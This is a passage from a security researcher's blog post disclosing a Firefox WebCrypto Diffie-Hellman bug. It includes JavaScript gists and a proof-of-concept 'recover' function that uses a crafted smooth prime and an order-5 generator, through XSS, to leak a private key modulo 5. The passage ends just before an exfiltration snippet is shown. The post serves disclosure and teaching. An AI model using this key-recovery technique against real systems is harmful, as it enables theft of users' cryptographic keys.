        <td id="file-dh-keypair-js-LC23">            <span>124</span><span>,</span><span>75</span><span>,</span><span>31</span><span>,</span><span>230</span><span>,</span><span>73</span><span>,</span><span>40</span><span>,</span><span>102</span><span>,</span><span>81</span><span>,</span><span>236</span><span>,</span><span>228</span><span>,</span><span>91</span><span>,</span><span>61</span><span>,</span><span>194</span><span>,</span><span>0</span><span>,</span><span>124</span><span>,</span><span>184</span><span>,</span><span>161</span><span>,</span><span>99</span><span>,</span><span>191</span><span>,</span><span>5</span><span>,</span><span>152</span><span>,</span><span>218</span><span>,</span></td>
      </tr>
      <tr>
        <td id="file-dh-keypair-js-L24" data-line-number="24"></td>
        <td id="file-dh-keypair-js-LC24">            <span>72</span><span>,</span><span>54</span><span>,</span><span>28</span><span>,</span><span>85</span><span>,</span><span>211</span><span>,</span><span>154</span><span>,</span><span>105</span><span>,</span><span>22</span><span>,</span><span>63</span><span>,</span><span>168</span><span>,</span><span>253</span><span>,</span><span>36</span><span>,</span><span>207</span><span>,</span><span>95</span><span>,</span><span>131</span><span>,</span><span>101</span><span>,</span><span>93</span><span>,</span><span>35</span><span>,</span><span>220</span><span>,</span><span>163</span><span>,</span><span>173</span><span>,</span></td>
      </tr>
      <tr>
        <td id="file-dh-keypair-js-L25" data-line-number="25"></td>
        <td id="file-dh-keypair-js-LC25">            <span>150</span><span>,</span><span>28</span><span>,</span><span>98</span><span>,</span><span>243</span><span>,</span><span>86</span><span>,</span><span>32</span><span>,</span><span>133</span><span>,</span><span>82</span><span>,</span><span>187</span><span>,</span><span>158</span><span>,</span><span>213</span><span>,</span><span>41</span><span>,</span><span>7</span><span>,</span><span>112</span><span>,</span><span>150</span><span>,</span><span>150</span><span>,</span><span>109</span><span>,</span><span>103</span><span>,</span><span>12</span><span>,</span><span>53</span><span>,</span><span>78</span><span>,</span><span>74</span><span>,</span></td>
      </tr>
      <tr>
        <td id="file-dh-keypair-js-L26" data-line-number="26"></td>
        <td id="file-dh-keypair-js-LC26">            <span>188</span><span>,</span><span>152</span><span>,</span><span>4</span><span>,</span><span>241</span><span>,</span><span>116</span><span>,</span><span>108</span><span>,</span><span>8</span><span>,</span><span>202</span><span>,</span><span>35</span><span>,</span><span>115</span><span>,</span><span>39</span><span>,</span><span>255</span><span>,</span><span>255</span><span>,</span><span>255</span><span>,</span><span>255</span><span>,</span><span>255</span><span>,</span><span>255</span><span>,</span><span>255</span><span>,</span><span>255</span></td>
      </tr>
      <tr>
        <td id="file-dh-keypair-js-L27" data-line-number="27"></td>
        <td id="file-dh-keypair-js-LC27">        <span>]</span><span>)</span><span>,</span></td>
      </tr>
      <tr>
        <td id="file-dh-keypair-js-L28" data-line-number="28"></td>
        <td id="file-dh-keypair-js-LC28">        <span>generator</span>: <span>new</span> <span>Uint8Array</span><span>(</span><span>[</span><span>2</span><span>]</span><span>)</span><span>,</span></td>
      </tr>
      <tr>
        <td id="file-dh-keypair-js-L29" data-line-number="29"></td>
        <td id="file-dh-keypair-js-LC29">    <span>}</span><span>,</span></td>
      </tr>
      <tr>
        <td id="file-dh-keypair-js-L30" data-line-number="30"></td>
        <td id="file-dh-keypair-js-LC30">    <span>false</span><span>,</span> <span>//whether the key is extractable (i.e. can be used in exportKey)</span></td>
      </tr>
      <tr>
        <td id="file-dh-keypair-js-L31" data-line-number="31"></td>
        <td id="file-dh-keypair-js-LC31">    <span>[</span><span>"deriveKey"</span><span>,</span> <span>"deriveBits"</span><span>]</span> <span>//can be any combination of "deriveKey" and "deriveBits"</span></td>
      </tr>
      <tr>
        <td id="file-dh-keypair-js-L32" data-line-number="32"></td>
        <td id="file-dh-keypair-js-LC32">   <span>)</span><span>;</span></td>
      </tr>
      <tr>
        <td id="file-dh-keypair-js-L33" data-line-number="33"></td>
        <td id="file-dh-keypair-js-LC33">    <span>return</span> <span>{</span></td>
      </tr>
      <tr>
        <td id="file-dh-keypair-js-L34" data-line-number="34"></td>
        <td id="file-dh-keypair-js-LC34">        <span>privateKey</span>: <span>kp</span><span>.</span><span>privateKey</span><span>,</span></td>
      </tr>
      <tr>
        <td id="file-dh-keypair-js-L35" data-line-number="35"></td>
        <td id="file-dh-keypair-js-LC35">        <span>publicKey</span>:  <span>kp</span><span>.</span><span>publicKey</span></td>
      </tr>
      <tr>
        <td id="file-dh-keypair-js-L36" data-line-number="36"></td>
        <td id="file-dh-keypair-js-LC36">    <span>}</span><span>;</span></td>
      </tr>
      <tr>
        <td id="file-dh-keypair-js-L37" data-line-number="37"></td>
        <td id="file-dh-keypair-js-LC37"><span>}</span></td>
      </tr>
</tbody></table>


  </div>

  </div>
</div>

      </div>
      
    </div>
</div>

<li><i>Bob</i> <b>generates</b> his own <b>key pair</b></li>
<li><i>Bob</i> can now <b>derive</b> a shared secret to use for example as a secret key for <b>AES-GCM</b> encryption (as above)</li>
<div id="gist100413061">
    <div>
      <div>
        <div>
  <div id="file-dh-derivebits-js">
    

  <div itemprop="text">
      
<table data-tab-size="8">
      <tbody><tr>
        <td id="file-dh-derivebits-js-L1" data-line-number="1"></td>
        <td id="file-dh-derivebits-js-LC1"><span>/*</span></td>
      </tr>
      <tr>
        <td id="file-dh-derivebits-js-L2" data-line-number="2"></td>
        <td id="file-dh-derivebits-js-LC2"><span> * Arguments:</span></td>
      </tr>
      <tr>
        <td id="file-dh-derivebits-js-L3" data-line-number="3"></td>
        <td id="file-dh-derivebits-js-LC3"><span> *   priv: CryptoKey representing a DH private key</span></td>
      </tr>
      <tr>
        <td id="file-dh-derivebits-js-L4" data-line-number="4"></td>
        <td id="file-dh-derivebits-js-LC4"><span> *   pub: CryptoKey representing a DH public key</span></td>
      </tr>
      <tr>
        <td id="file-dh-derivebits-js-L5" data-line-number="5"></td>
        <td id="file-dh-derivebits-js-LC5"><span> *</span></td>
      </tr>
      <tr>
        <td id="file-dh-derivebits-js-L6" data-line-number="6"></td>
        <td id="file-dh-derivebits-js-LC6"><span> * Returns: Promise resolving to ArrayBuffer</span></td>
      </tr>
      <tr>
        <td id="file-dh-derivebits-js-L7" data-line-number="7"></td>
        <td id="file-dh-derivebits-js-LC7"><span> */</span></td>
      </tr>
      <tr>
        <td id="file-dh-derivebits-js-L8" data-line-number="8"></td>
        <td id="file-dh-derivebits-js-LC8"><span>async</span> <span>function</span> <span>secret</span><span>(</span><span>priv</span><span>,</span> <span>pub</span><span>)</span> <span>{</span></td>
      </tr>
      <tr>
        <td id="file-dh-derivebits-js-L9" data-line-number="9"></td>
        <td id="file-dh-derivebits-js-LC9">  <span>return</span> <span>await</span> <span>window</span><span>.</span><span>crypto</span><span>.</span><span>subtle</span><span>.</span><span>deriveBits</span><span>(</span></td>
      </tr>
      <tr>
        <td id="file-dh-derivebits-js-L10" data-line-number="10"></td>
        <td id="file-dh-derivebits-js-LC10">    <span>{</span></td>
      </tr>
      <tr>
        <td id="file-dh-derivebits-js-L11" data-line-number="11"></td>
        <td id="file-dh-derivebits-js-LC11">        <span>name</span>: <span>"DH"</span><span>,</span></td>
      </tr>
      <tr>
        <td id="file-dh-derivebits-js-L12" data-line-number="12"></td>
        <td id="file-dh-derivebits-js-LC12">        <span>//NOTE: THIS IS A SMALL PRIME FOR TESTING ONLY! DO NOT USE IT FOR REAL!</span></td>
      </tr>
      <tr>
        <td id="file-dh-derivebits-js-L13" data-line-number="13"></td>
        <td id="file-dh-derivebits-js-LC13">        <span>//See http://datatracker.ietf.org/doc/rfc3526/ for better primes</span></td>
      </tr>
      <tr>
        <td id="file-dh-derivebits-js-L14" data-line-number="14"></td>
        <td id="file-dh-derivebits-js-LC14">        <span>prime</span>: <span>new</span> <span>Uint8Array</span><span>(</span><span>[</span></td>
      </tr>
      <tr>
        <td id="file-dh-derivebits-js-L15" data-line-number="15"></td>
        <td id="file-dh-derivebits-js-LC15">            <span>255</span><span>,</span><span>255</span><span>,</span><span>255</span><span>,</span><span>255</span><span>,</span><span>255</span><span>,</span><span>255</span><span>,</span><span>255</span><span>,</span><span>255</span><span>,</span><span>201</span><span>,</span><span>15</span><span>,</span><span>218</span><span>,</span><span>162</span><span>,</span><span>33</span><span>,</span><span>104</span><span>,</span><span>194</span><span>,</span><span>52</span><span>,</span><span>196</span><span>,</span><span>198</span><span>,</span><span>98</span><span>,</span><span>139</span><span>,</span></td>
      </tr>
      <tr>
        <td id="file-dh-derivebits-js-L16" data-line-number="16"></td>
        <td id="file-dh-derivebits-js-LC16">            <span>128</span><span>,</span><span>220</span><span>,</span><span>28</span><span>,</span><span>209</span><span>,</span><span>41</span><span>,</span><span>2</span><span>,</span><span>78</span><span>,</span><span>8</span><span>,</span><span>138</span><span>,</span><span>103</span><span>,</span><span>204</span><span>,</span><span>116</span><span>,</span><span>2</span><span>,</span><span>11</span><span>,</span><span>190</span><span>,</span><span>166</span><span>,</span><span>59</span><span>,</span><span>19</span><span>,</span><span>155</span><span>,</span><span>34</span><span>,</span><span>81</span><span>,</span><span>74</span><span>,</span><span>8</span><span>,</span></td>
      </tr>
      <tr>
        <td id="file-dh-derivebits-js-L17" data-line-number="17"></td>
        <td id="file-dh-derivebits-js-LC17">            <span>121</span><span>,</span><span>142</span><span>,</span><span>52</span><span>,</span><span>4</span><span>,</span><span>221</span><span>,</span><span>239</span><span>,</span><span>149</span><span>,</span><span>25</span><span>,</span><span>179</span><span>,</span><span>205</span><span>,</span><span>58</span><span>,</span><span>67</span><span>,</span><span>27</span><span>,</span><span>48</span><span>,</span><span>43</span><span>,</span><span>10</span><span>,</span><span>109</span><span>,</span><span>242</span><span>,</span><span>95</span><span>,</span><span>20</span><span>,</span><span>55</span><span>,</span><span>79</span><span>,</span><span>225</span><span>,</span></td>
      </tr>
      <tr>
        <td id="file-dh-derivebits-js-L18" data-line-number="18"></td>
        <td id="file-dh-derivebits-js-LC18">            <span>53</span><span>,</span><span>109</span><span>,</span><span>109</span><span>,</span><span>81</span><span>,</span><span>194</span><span>,</span><span>69</span><span>,</span><span>228</span><span>,</span><span>133</span><span>,</span><span>181</span><span>,</span><span>118</span><span>,</span><span>98</span><span>,</span><span>94</span><span>,</span><span>126</span><span>,</span><span>198</span><span>,</span><span>244</span><span>,</span><span>76</span><span>,</span><span>66</span><span>,</span><span>233</span><span>,</span><span>166</span><span>,</span><span>55</span><span>,</span><span>237</span><span>,</span></td>
      </tr>
      <tr>
        <td id="file-dh-derivebits-js-L19" data-line-number="19"></td>
        <td id="file-dh-derivebits-js-LC19">            <span>107</span><span>,</span><span>11</span><span>,</span><span>255</span><span>,</span><span>92</span><span>,</span><span>182</span><span>,</span><span>244</span><span>,</span><span>6</span><span>,</span><span>183</span><span>,</span><span>237</span><span>,</span><span>238</span><span>,</span><span>56</span><span>,</span><span>107</span><span>,</span><span>251</span><span>,</span><span>90</span><span>,</span><span>137</span><span>,</span><span>159</span><span>,</span><span>165</span><span>,</span><span>174</span><span>,</span><span>159</span><span>,</span><span>36</span><span>,</span><span>17</span><span>,</span></td>
      </tr>
      <tr>
        <td id="file-dh-derivebits-js-L20" data-line-number="20"></td>
        <td id="file-dh-derivebits-js-LC20">            <span>124</span><span>,</span><span>75</span><span>,</span><span>31</span><span>,</span><span>230</span><span>,</span><span>73</span><span>,</span><span>40</span><span>,</span><span>102</span><span>,</span><span>81</span><span>,</span><span>236</span><span>,</span><span>228</span><span>,</span><span>91</span><span>,</span><span>61</span><span>,</span><span>194</span><span>,</span><span>0</span><span>,</span><span>124</span><span>,</span><span>184</span><span>,</span><span>161</span><span>,</span><span>99</span><span>,</span><span>191</span><span>,</span><span>5</span><span>,</span><span>152</span><span>,</span><span>218</span><span>,</span></td>
      </tr>
      <tr>
        <td id="file-dh-derivebits-js-L21" data-line-number="21"></td>
        <td id="file-dh-derivebits-js-LC21">            <span>72</span><span>,</span><span>54</span><span>,</span><span>28</span><span>,</span><span>85</span><span>,</span><span>211</span><span>,</span><span>154</span><span>,</span><span>105</span><span>,</span><span>22</span><span>,</span><span>63</span><span>,</span><span>168</span><span>,</span><span>253</span><span>,</span><span>36</span><span>,</span><span>207</span><span>,</span><span>95</span><span>,</span><span>131</span><span>,</span><span>101</span><span>,</span><span>93</span><span>,</span><span>35</span><span>,</span><span>220</span><span>,</span><span>163</span><span>,</span><span>173</span><span>,</span></td>
      </tr>
      <tr>
        <td id="file-dh-derivebits-js-L22" data-line-number="22"></td>
        <td id="file-dh-derivebits-js-LC22">            <span>150</span><span>,</span><span>28</span><span>,</span><span>98</span><span>,</span><span>243</span><span>,</span><span>86</span><span>,</span><span>32</span><span>,</span><span>133</span><span>,</span><span>82</span><span>,</span><span>187</span><span>,</span><span>158</span><span>,</span><span>213</span><span>,</span><span>41</span><span>,</span><span>7</span><span>,</span><span>112</span><span>,</span><span>150</span><span>,</span><span>150</span><span>,</span><span>109</span><span>,</span><span>103</span><span>,</span><span>12</span><span>,</span><span>53</span><span>,</span><span>78</span><span>,</span><span>74</span><span>,</span></td>
      </tr>
      <tr>
        <td id="file-dh-derivebits-js-L23" data-line-number="23"></td>
        <td id="file-dh-derivebits-js-LC23">            <span>188</span><span>,</span><span>152</span><span>,</span><span>4</span><span>,</span><span>241</span><span>,</span><span>116</span><span>,</span><span>108</span><span>,</span><span>8</span><span>,</span><span>202</span><span>,</span><span>35</span><span>,</span><span>115</span><span>,</span><span>39</span><span>,</span><span>255</span><span>,</span><span>255</span><span>,</span><span>255</span><span>,</span><span>255</span><span>,</span><span>255</span><span>,</span><span>255</span><span>,</span><span>255</span><span>,</span><span>255</span></td>
      </tr>
      <tr>
        <td id="file-dh-derivebits-js-L24" data-line-number="24"></td>
        <td id="file-dh-derivebits-js-LC24">        <span>]</span><span>)</span><span>,</span></td>
      </tr>
      <tr>
        <td id="file-dh-derivebits-js-L25" data-line-number="25"></td>
        <td id="file-dh-derivebits-js-LC25">        <span>generator</span>: <span>new</span> <span>Uint8Array</span><span>(</span><span>[</span><span>2</span><span>]</span><span>)</span><span>,</span></td>
      </tr>
      <tr>
        <td id="file-dh-derivebits-js-L26" data-line-number="26"></td>
        <td id="file-dh-derivebits-js-LC26">        <span>public</span>: <span>pub</span></td>
      </tr>
      <tr>
        <td id="file-dh-derivebits-js-L27" data-line-number="27"></td>
        <td id="file-dh-derivebits-js-LC27">    <span>}</span><span>,</span></td>
      </tr>
      <tr>
        <td id="file-dh-derivebits-js-L28" data-line-number="28"></td>
        <td id="file-dh-derivebits-js-LC28">    <span>priv</span><span>,</span> <span>//your DH private key from generateKey or importKey</span></td>
      </tr>
      <tr>
        <td id="file-dh-derivebits-js-L29" data-line-number="29"></td>
        <td id="file-dh-derivebits-js-LC29">    <span>256</span><span>//the number of bits you want to derive</span></td>
      </tr>
      <tr>
        <td id="file-dh-derivebits-js-L30" data-line-number="30"></td>
        <td id="file-dh-derivebits-js-LC30">    <span>)</span><span>;</span></td>
      </tr>
      <tr>
        <td id="file-dh-derivebits-js-L31" data-line-number="31"></td>
        <td id="file-dh-derivebits-js-LC31"><span>}</span></td>
      </tr>
</tbody></table>


  </div>

  </div>
</div>

      </div>
      
    </div>
</div>

</ol>
<h2>
<span>The Bug</span></h2><p>
Pfiuuu so let's talk about the bug. One of the biggest criticism that people makes about DH is that the choice of parameters is error prone. Indeed differently from <b>ECDH </b>where the set of curves to use is limited (<i><b>P-256</b></i> and <i><b>Curve25519</b></i> are probably covering almost 100% of the use cases) for the finite field case it is possible to use any prime number that is sufficiently large (also for this case exist some specification that suggest some specific numbers, see also my previous <a href="https://blog.intothesymmetry.com/2016/01/what-heck-is-rfc-5114.html">post</a>). In order to avoid most of the attacks a prime number used for DH needs to cover two important requirements:</p></div>

<div>
<ol>
<li>Being sufficiently large (at least 2048 bits in 2019)</li>
<li>Being <span>p</span> the prime number chosen <span>p-1</span> needs to be not smooth (again refer to my previous 2 posts for more details <a href="https://blog.intothesymmetry.com/2016/01/what-heck-is-rfc-5114.html">1</a>,<a href="https://blog.intothesymmetry.com/2016/01/openssl-key-recovery-attack-on-dh-small.html">2</a>). Many primes in the specifications are so called <a href="https://en.wikipedia.org/wiki/Safe_prime">safe primes</a> in order to meet the non smoothness requirement.</li>
</ol><p>
Now let's assume a website implement the scenario depicted above with a <i><b>safe prime</b></i> taken from some IETF specification and let's also assume an attacker was able to gain some </p><u><b>XSS privilege</b></u><p> in this website. The following snippet shows how the attacker will be able to recover the private key using the <i><b>Small Subgroups Key Recovery Attack</b></i> (I am a biiiiiiit lazy and I extracted only the key modulo 5, a full attack would use several prime numbers and then <a href="https://en.wikipedia.org/wiki/Chinese_remainder_theorem"><i><b>Chinese Remainder Theorem- </b><b>CRT</b></i></a> to recover the full key, again you can find full explanation in my previous<b> <a href="https://blog.intothesymmetry.com/2016/01/openssl-key-recovery-attack-on-dh-small.html">OpenSSL blog pos</a><a href="https://www.blogger.com/null">t</a></b>).
</p><div id="gist100414435">
    <div>
      <div>
        <div>
  <div id="file-dh-recover-js">
    

  <div itemprop="text">
      
<table data-tab-size="8">
      <tbody><tr>
        <td id="file-dh-recover-js-L1" data-line-number="1"></td>
        <td id="file-dh-recover-js-LC1"><span>function</span> <span>recover</span><span>(</span><span>privateKey</span><span>)</span> <span>{</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L2" data-line-number="2"></td>
        <td id="file-dh-recover-js-LC2">    <span>console</span><span>.</span><span>log</span><span>(</span><span>"recover"</span><span>)</span><span>;</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L3" data-line-number="3"></td>
        <td id="file-dh-recover-js-LC3">    <span>const</span> <span>MALICIOUS_PRIME</span> <span>=</span> <span>new</span> <span>Uint8Array</span><span>(</span><span>[</span><span>129</span><span>,</span><span>0</span><span>,</span><span>0</span><span>,</span><span>0</span><span>,</span><span>0</span><span>,</span><span>0</span><span>,</span><span>0</span><span>,</span><span>0</span><span>,</span><span>0</span><span>,</span><span>0</span><span>,</span><span>0</span><span>,</span><span>0</span><span>,</span><span>0</span><span>,</span><span>0</span><span>,</span><span>0</span><span>,</span><span>17</span><span>]</span><span>)</span><span>;</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L4" data-line-number="4"></td>
        <td id="file-dh-recover-js-LC4">    <span>// this generator has order 5</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L5" data-line-number="5"></td>
        <td id="file-dh-recover-js-LC5">    <span>const</span> <span>MALICIOUS_GENERATOR</span> <span>=</span> <span>new</span> <span>Uint8Array</span><span>(</span><span>[</span><span>46</span><span>,</span><span>35</span><span>,</span><span>147</span><span>,</span><span>92</span><span>,</span><span>93</span><span>,</span><span>21</span><span>,</span><span>176</span><span>,</span><span>170</span><span>,</span><span>70</span><span>,</span><span>144</span><span>,</span><span>93</span><span>,</span><span>164</span><span>,</span><span>112</span><span>,</span><span>85</span><span>,</span><span>178</span><span>,</span><span>126</span><span>]</span><span>)</span><span>;</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L6" data-line-number="6"></td>
        <td id="file-dh-recover-js-LC6">
</td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L7" data-line-number="7"></td>
        <td id="file-dh-recover-js-LC7">    <span>privateKey</span><span>.</span><span>algorithm</span><span>.</span><span>generator</span> <span>=</span>  <span>MALICIOUS_GENERATOR</span><span>;</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L8" data-line-number="8"></td>
        <td id="file-dh-recover-js-LC8">    <span>privateKey</span><span>.</span><span>algorithm</span><span>.</span><span>prime</span> <span>=</span>  <span>MALICIOUS_PRIME</span><span>;</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L9" data-line-number="9"></td>
        <td id="file-dh-recover-js-LC9">    <span>window</span><span>.</span><span>crypto</span><span>.</span><span>subtle</span><span>.</span><span>generateKey</span><span>(</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L10" data-line-number="10"></td>
        <td id="file-dh-recover-js-LC10">    <span>{</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L11" data-line-number="11"></td>
        <td id="file-dh-recover-js-LC11">        <span>name</span>: <span>"DH"</span><span>,</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L12" data-line-number="12"></td>
        <td id="file-dh-recover-js-LC12">        <span>prime</span>: <span>MALICIOUS_PRIME</span><span>,</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L13" data-line-number="13"></td>
        <td id="file-dh-recover-js-LC13">        <span>generator</span>: <span>MALICIOUS_GENERATOR</span><span>,</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L14" data-line-number="14"></td>
        <td id="file-dh-recover-js-LC14">    <span>}</span><span>,</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L15" data-line-number="15"></td>
        <td id="file-dh-recover-js-LC15">    <span>false</span><span>,</span> <span>//whether the key is extractable (i.e. can be used in exportKey)</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L16" data-line-number="16"></td>
        <td id="file-dh-recover-js-LC16">    <span>[</span><span>"deriveKey"</span><span>,</span> <span>"deriveBits"</span><span>]</span> <span>//can be any combination of "deriveKey" and "deriveBits"</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L17" data-line-number="17"></td>
        <td id="file-dh-recover-js-LC17">    <span>)</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L18" data-line-number="18"></td>
        <td id="file-dh-recover-js-LC18">    <span>.</span><span>then</span><span>(</span><span>function</span><span>(</span><span>maliciousKey</span><span>)</span><span>{</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L19" data-line-number="19"></td>
        <td id="file-dh-recover-js-LC19">         </td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L20" data-line-number="20"></td>
        <td id="file-dh-recover-js-LC20">        <span>window</span><span>.</span><span>crypto</span><span>.</span><span>subtle</span><span>.</span><span>deriveBits</span><span>(</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L21" data-line-number="21"></td>
        <td id="file-dh-recover-js-LC21">        <span>{</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L22" data-line-number="22"></td>
        <td id="file-dh-recover-js-LC22">            <span>name</span>: <span>"DH"</span><span>,</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L23" data-line-number="23"></td>
        <td id="file-dh-recover-js-LC23">            <span>prime</span>: <span>MALICIOUS_PRIME</span><span>,</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L24" data-line-number="24"></td>
        <td id="file-dh-recover-js-LC24">            <span>generator</span>: <span>MALICIOUS_GENERATOR</span><span>,</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L25" data-line-number="25"></td>
        <td id="file-dh-recover-js-LC25">            <span>public</span>: <span>maliciousKey</span><span>.</span><span>publicKey</span><span>,</span> <span>//a DH public key from generateKey or importKey</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L26" data-line-number="26"></td>
        <td id="file-dh-recover-js-LC26">        <span>}</span><span>,</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L27" data-line-number="27"></td>
        <td id="file-dh-recover-js-LC27">        <span>maliciousKey</span><span>.</span><span>privateKey</span><span>,</span> <span>//your DH private key from generateKey or importKey</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L28" data-line-number="28"></td>
        <td id="file-dh-recover-js-LC28">        <span>128</span> <span>//the number of bits you want to derive</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L29" data-line-number="29"></td>
        <td id="file-dh-recover-js-LC29">        <span>)</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L30" data-line-number="30"></td>
        <td id="file-dh-recover-js-LC30">        <span>.</span><span>then</span><span>(</span><span>function</span><span>(</span><span>bits</span><span>)</span><span>{</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L31" data-line-number="31"></td>
        <td id="file-dh-recover-js-LC31">            <span>array</span> <span>=</span> <span>new</span> <span>Uint8Array</span><span>(</span><span>bits</span><span>)</span><span>;</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L32" data-line-number="32"></td>
        <td id="file-dh-recover-js-LC32">            <span>if</span> <span>(</span><span>array</span><span>[</span><span>0</span><span>]</span> <span>==</span> <span>46</span><span>)</span> <span>{</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L33" data-line-number="33"></td>
        <td id="file-dh-recover-js-LC33">                <span>alert</span><span>(</span><span>"the private key is equal to 1 mod 5"</span><span>)</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L34" data-line-number="34"></td>
        <td id="file-dh-recover-js-LC34">            <span>}</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L35" data-line-number="35"></td>
        <td id="file-dh-recover-js-LC35">            <span>if</span> <span>(</span><span>array</span><span>[</span><span>0</span><span>]</span> <span>==</span> <span>115</span><span>)</span> <span>{</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L36" data-line-number="36"></td>
        <td id="file-dh-recover-js-LC36">                <span>alert</span><span>(</span><span>"the private key is equal to 2 mod 5"</span><span>)</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L37" data-line-number="37"></td>
        <td id="file-dh-recover-js-LC37">            <span>}</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L38" data-line-number="38"></td>
        <td id="file-dh-recover-js-LC38">            <span>if</span> <span>(</span><span>array</span><span>[</span><span>0</span><span>]</span> <span>==</span> <span>58</span><span>)</span> <span>{</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L39" data-line-number="39"></td>
        <td id="file-dh-recover-js-LC39">                <span>alert</span><span>(</span><span>"the private key is equal to 3 mod 5"</span><span>)</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L40" data-line-number="40"></td>
        <td id="file-dh-recover-js-LC40">            <span>}</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L41" data-line-number="41"></td>
        <td id="file-dh-recover-js-LC41">            <span>if</span> <span>(</span><span>array</span><span>[</span><span>0</span><span>]</span> <span>==</span> <span>38</span><span>)</span> <span>{</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L42" data-line-number="42"></td>
        <td id="file-dh-recover-js-LC42">                <span>alert</span><span>(</span><span>"the private key is equal to 4 mod 5"</span><span>)</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L43" data-line-number="43"></td>
        <td id="file-dh-recover-js-LC43">            <span>}</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L44" data-line-number="44"></td>
        <td id="file-dh-recover-js-LC44">            <span>console</span><span>.</span><span>log</span><span>(</span><span>array</span><span>)</span><span>;</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L45" data-line-number="45"></td>
        <td id="file-dh-recover-js-LC45">
</td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L46" data-line-number="46"></td>
        <td id="file-dh-recover-js-LC46">        <span>}</span><span>)</span><span>.</span><span>catch</span><span>(</span><span>function</span><span>(</span><span>err</span><span>)</span><span>{</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L47" data-line-number="47"></td>
        <td id="file-dh-recover-js-LC47">            <span>console</span><span>.</span><span>error</span><span>(</span><span>err</span><span>)</span><span>;</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L48" data-line-number="48"></td>
        <td id="file-dh-recover-js-LC48">        <span>}</span><span>)</span><span>;</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L49" data-line-number="49"></td>
        <td id="file-dh-recover-js-LC49">    <span>}</span><span>)</span><span>;</span></td>
      </tr>
      <tr>
        <td id="file-dh-recover-js-L50" data-line-number="50"></td>
        <td id="file-dh-recover-js-LC50"><span>}</span></td>
      </tr>
</tbody></table>


  </div>

  </div>
</div>

      </div>
      
    </div>
</div>
<p>
The vulnerable code is the one at <span>line 7</span> and<span> line 8 </span><span>:</span></p><p><span><span>const MALICIOUS_PRIME = new Uint8Array([129,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17]);<br>&nbsp;&nbsp;&nbsp; // this generator has order 5</span></span></p>
<p><span><span>const MALICIOUS_GENERATOR = new Uint8Array([46,35,147,92,93,21,176,170,70,144,93,164,112,85,178,126]);</span></span><b><span><span> </span></span></b></p>
<p><b><span><span>privateKey.algorithm.prime = MALICIOUS_PRIME;<br>privateKey.algorithm.generator = MALICIOUS_GENERATOR;&nbsp;</span></span></b>&nbsp;
<span></span>&nbsp;</p>
<p>
Let me explain, what the attacker achieved here was to:</p><ol>
<li><span>Craft a malicious<b> prime number </b>(the prime number used in this example is <span>171470411456254147604591110776164450321</span> that has <span>p-1</span> equals to <span>2^4 * 5 * 23 * 2082757 * 744748579247 * 60079053324863537&nbsp;</span> (so it is kind of smooth)</span></li>
<li><span>Forge a malicious <b>generator </b>(in this example I used a generator of <u><b><span>order 5</span></b></u>, see also the <span>p-1</span> above)</span></li>
<li><b><span>Redefine the generator and the prime associated with the existing private key!!!!</span></b><u><b><span> (THIS IS THE REAL BUG)</span></b></u></li>
<li><span>Repeat this with many <b>prime numbers/generators</b></span></li>
<li><span>Use <b>CRT</b> to recover&nbsp; the full private key</span></li>
</ol>
<p><span>Well that's about it. Luckily as the telemetry data showed this API (but the WebCrypto API in general is not really used/popular) so Firefox could safely remove completely this non standard API rather than fix the bug<span>.</span></span></p><h2>
<span>Demo Time</span></h2><p>
You can find a simple demo at <a href="https://asanso.github.io/firefox/victim.html">https://asanso.github.io/firefox/victim.html</a> . It simply does an <span>alert()</span> with the extracted <b>private key modulo 5</b>. As said I was a lazy to implement the full attack (sorry :( ) but I hope you got the point. As a bonus point though I added some little snippet on how an attacker could exfiltrate the key using <span>postMessage:</span><br>
